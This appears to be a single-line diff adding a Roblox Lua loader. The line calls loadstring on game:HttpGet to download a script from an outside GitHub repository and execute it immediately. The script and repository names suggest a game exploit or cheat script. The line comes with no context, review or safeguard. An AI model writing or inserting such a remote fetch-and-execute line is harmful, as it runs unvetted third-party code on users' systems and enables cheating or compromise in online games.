@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/hm-corruption-megamind-drop-crazy-skelet-spam3-yk7olspeigwm32.lua"))()
